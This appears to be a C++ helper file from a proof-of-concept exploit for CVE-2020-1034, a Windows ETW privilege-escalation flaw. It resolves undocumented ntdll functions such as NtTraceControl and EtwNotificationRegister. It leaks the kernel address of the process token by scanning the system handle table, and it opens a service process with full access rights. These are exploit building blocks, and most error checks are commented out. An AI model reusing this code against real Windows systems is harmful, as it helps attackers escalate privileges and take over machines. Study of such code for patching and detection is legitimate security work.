#include "pch.h"
#include "utils.h"


namespace cve_2020_1034 {
namespace details {

	static constexpr auto szNtDll = L"ntdll.dll";

	static constexpr auto szNtTraceControl = "NtTraceControl";
	using PNtTraceControl = NTSTATUS(WINAPI*)(
		DWORD Operation, LPVOID InputBuffer, DWORD InputSize, 
		LPVOID OutputBuffer, DWORD OutputSize, LPDWORD BytesReturned);

	static constexpr auto szEtwNotificationRegister = "EtwNotificationRegister";
	using PEtwNotificationRegister = ULONG(*)(
		LPCGUID Guid, ULONG Type, PVOID Callback, PVOID Context, REGHANDLE* RegHandle);

	static constexpr auto szNtQuerySystemInformation = "NtQuerySystemInformation";
	using PNtQuerySystemInformation = NTSTATUS(NTAPI*)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation,
		ULONG SystemInformationLength, PULONG ReturnLength);

	static constexpr auto szNtQueryObject = "NtQueryObject";
	using PNtQueryObject = NTSTATUS(NTAPI*)(
		HANDLE Handle, OBJECT_INFORMATION_CLASS ObjectInformationClass, 
		PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);


	ULONG GetTokenObjectIndex()
	{
		static PNtQueryObject pfnNtQueryObject = nullptr;

		if (!pfnNtQueryObject)
		{
			static const HMODULE hNtDll = ::GetModuleHandle(szNtDll);
			//NATIVE_CHECK_POINTER_LAST(hNtDll);

			pfnNtQueryObject = reinterpret_cast<PNtQueryObject>(
				::GetProcAddress(hNtDll, szNtQueryObject));
			//NATIVE_CHECK_POINTER_LAST(pfnNtQueryObject);

			wprintf(__FUNCTIONW__ L": pfnNtQueryObject == %p\n", pfnNtQueryObject);
		}

		//
		// Open current process token
		//
		
		ATL::CAccessToken ProcessToken;
		if (!ProcessToken.GetProcessToken(TOKEN_ALL_ACCESS)) {
			//NATIVE_THROW_LAST();
		}

		//
		// Obtain token type information
		//
		
		struct {
			OBJECT_TYPE_INFORMATION TypeInfo;
			WCHAR TypeNameBuffer[sizeof("Token")];
		} TypeInfoWithName;

		NTSTATUS Status = pfnNtQueryObject(ProcessToken.GetHandle(), ObjectTypeInformation, 
			&TypeInfoWithName, sizeof(TypeInfoWithName), nullptr);
		//NATIVE_CHECK_ERROR(Status);

		//
		// Return type index
		//
		
		return TypeInfoWithName.TypeInfo.TypeIndex;
	}


	struct CloseServiceHandleWrapper final
	{
		void operator()(SC_HANDLE h) const noexcept
		{
			if (h) {
				::CloseServiceHandle(h);
			}
		}
	};


	using ScHandle = std::unique_ptr<std::remove_pointer_t<SC_HANDLE>, CloseServiceHandleWrapper>;

} // namespace details


	LPVOID GetTokenAddress(HANDLE hToken)
	{
		static details::PNtQuerySystemInformation pfnNtQuerySystemInformation = nullptr;

		if (!pfnNtQuerySystemInformation)
		{
			static const HMODULE hNtDll = ::GetModuleHandle(details::szNtDll);
			//NATIVE_CHECK_POINTER_LAST(hNtDll);

			pfnNtQuerySystemInformation = reinterpret_cast<details::PNtQuerySystemInformation>(
				::GetProcAddress(hNtDll, details::szNtQuerySystemInformation));
			//NATIVE_CHECK_POINTER_LAST(pfnNtQuerySystemInformation);

			wprintf(__FUNCTIONW__ L": pfnNtQuerySystemInformation == %p\n", pfnNtQuerySystemInformation);
		}

		//
		// Let's obtain token type index
		//
		
		const auto ulTokenIndex = details::GetTokenObjectIndex();

		//
		// Check how nig the handle table is
		//
		
		ULONG                     cbSpaceNeeded   = 0;
		SYSTEM_HANDLE_INFORMATION LocalHandleInfo = {};

		NTSTATUS Status = pfnNtQuerySystemInformation(SystemHandleInformation, &LocalHandleInfo, 
			sizeof(LocalHandleInfo), &cbSpaceNeeded);
		
		//
		// Should fail here!
		// 

		if (NT_SUCCESS(Status)) {
			//NATIVE_THROW(ERROR_UNIDENTIFIED_ERROR);
		}

		//
		// Allocate buffer for 100 more structs
		//
		
		cbSpaceNeeded += 100 * sizeof(SYSTEM_HANDLE_INFORMATION);
		std::vector<BYTE> HandleInfoBuffer(cbSpaceNeeded, 0);
		auto HandleInfo = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(HandleInfoBuffer.data());

		Status = pfnNtQuerySystemInformation(SystemHandleInformation, HandleInfo, cbSpaceNeeded, &cbSpaceNeeded);
		//NATIVE_CHECK_ERROR(Status);

		//
		// Iterate over all received structs
		//
		
		for (unsigned long i = 0; i < HandleInfo->NumberOfHandles; ++i)
		{
			//
			// Check if it's the token of this process
			//
			
			const auto [ulObjectIndex, ProcessId, Handle] = std::make_tuple(HandleInfo->Handles[i].ObjectTypeIndex, 
				HandleInfo->Handles[i].UniqueProcessId, reinterpret_cast<HANDLE>(HandleInfo->Handles[i].HandleValue));

			if (ulObjectIndex == ulTokenIndex && ProcessId == ::GetCurrentProcessId() && Handle == hToken)
			{
				wprintf(L"Found current process token\n");
				return HandleInfo->Handles[i].Object;
			}
		}

		SetLastError(ERROR_UNIDENTIFIED_ERROR);
		return nullptr;
	}


	HANDLE GetServiceHandle(LPCWSTR lpszService)
	{
		//
		// Connect to SCM
		//
		
		details::ScHandle hScm{ ::OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT) };
		//NATIVE_CHECK_POINTER_LAST(hScm);

		//
		// Open service
		//
		
		details::ScHandle hRpc{ ::OpenService(hScm.get(), lpszService, SERVICE_QUERY_STATUS) };
		//NATIVE_CHECK_POINTER_LAST(hRpc);

		//
		// Obtain information about service process
		//
		 
		SERVICE_STATUS_PROCESS ProcessInfo = {};
		DWORD dwDummy = 0;

		if (!::QueryServiceStatusEx(hRpc.get(), SC_STATUS_PROCESS_INFO,
			reinterpret_cast<LPBYTE>(&ProcessInfo), sizeof(ProcessInfo), &dwDummy)) {
			//NATIVE_THROW_LAST();
		}

		//
		// Open process and return its handle
		//
		
		HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessInfo.dwProcessId);
		//NATIVE_CHECK_POINTER_LAST(hProcess);

		return hProcess;
	}


	ULONG EtwNotificationRegister(LPCGUID Guid, ULONG Type, PVOID Callback, PVOID Context, REGHANDLE* RegHandle)
	{
		static details::PEtwNotificationRegister pfnEtwNotificationRegister = nullptr;

		if (!pfnEtwNotificationRegister)
		{
			static const HMODULE hNtDll = ::GetModuleHandle(details::szNtDll);
			//NATIVE_CHECK_POINTER_LAST(hNtDll);

			pfnEtwNotificationRegister = reinterpret_cast<details::PEtwNotificationRegister>(
				::GetProcAddress(hNtDll, details::szEtwNotificationRegister));
			//NATIVE_CHECK_POINTER_LAST(pfnEtwNotificationRegister);

			wprintf(__FUNCTIONW__ L": pfnEtwNotificationRegister == %p\n", pfnEtwNotificationRegister);
		}

		return pfnEtwNotificationRegister(Guid, Type, Callback, Context, RegHandle);
	}


	NTSTATUS NtTraceControl(DWORD Operation, LPVOID InputBuffer, DWORD InputSize, LPVOID OutputBuffer, DWORD OutputSize, LPDWORD BytesReturned)
	{
		static details::PNtTraceControl pfnNtTraceControl = nullptr;

		if (!pfnNtTraceControl)
		{
			static const HMODULE hNtDll = ::GetModuleHandle(details::szNtDll);
			//NATIVE_CHECK_POINTER_LAST(hNtDll);

			pfnNtTraceControl = reinterpret_cast<details::PNtTraceControl>(
				::GetProcAddress(hNtDll, details::szNtTraceControl));
			//NATIVE_CHECK_POINTER_LAST(pfnNtTraceControl);

			wprintf(__FUNCTIONW__ L": pfnNtTraceControl == %p\n", pfnNtTraceControl);
		}

		return pfnNtTraceControl(Operation, InputBuffer, InputSize, OutputBuffer, OutputSize, BytesReturned);
	}

} // namespace cve_2020_1034